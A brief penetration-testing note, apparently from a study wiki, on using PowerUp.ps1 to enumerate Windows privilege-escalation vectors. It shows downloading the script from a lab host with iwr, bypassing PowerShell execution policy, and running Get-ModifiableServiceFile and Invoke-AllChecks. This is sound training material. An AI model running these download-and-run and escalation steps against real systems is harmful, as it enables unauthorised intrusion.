# PowerUp.ps1

automated tool to detect the priv esc vector

{% code overflow="wrap" %}
```
PS C:\Users\dave> iwr -uri http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1 
PS C:\Users\dave> powershell -ep bypass 
... 
PS C:\Users\dave> . .\PowerUp.ps1 
```
{% endcode %}

_powershell -ep bypass_ - start powershell with ExecutionPolicy Bypass. Otherwise, it won’t be possible to run scripts as they are blocked.

_Get-ModifiableServiceFile_ - displays the services the current user can modify, such as the service binary or config files

```
Get-ModifiableServiceFile
```

_Invoke-AllChecks_ – displays a full set of privilege escalation checks the current user can run, including modifiable services, unquoted paths, and weak permissions.

```
Invoke-AllChecks
```

* will show any quick wins
* tells us what to look for in winpeas
* tells us if we need to do UAC bypass
